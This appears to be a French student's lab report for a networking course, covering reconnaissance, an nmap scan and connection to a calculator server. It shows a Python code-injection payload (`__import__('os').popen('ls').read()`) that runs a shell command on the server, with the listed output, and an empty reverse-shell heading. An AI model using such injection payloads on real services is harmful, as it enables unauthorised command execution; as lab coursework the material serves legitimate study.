# 1. Reconnaissance

🌞 Déterminer

#### 🦈TP5_Determiner.pcapng 


🌞 Scanner le réseau

trouvez une ou plusieurs machines qui héberge une app sur ce port

### 🦈p5_nmap.pcapng 

🌞 Connectez-vous au serveur

```
tom@Tom:~/Documents/B2-Reseau$ /bin/python3 /home/tom/Documents/B2-Reseau/tp5/client.py

```
C'est une calculattrice 

🌞 Injecter du code serveur

```

    userMessage = "__import__('os').popen('ls').read()"

```
```
tom@Tom:~/Documents/B2-Reseau$ /bin/python3 /home/tom/Documents/B2-Reseau/tp5/client.py
'afs\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nva
```
# 3. Reverse shell


🌞 Obtenez un reverse shell sur le serveur
```

```

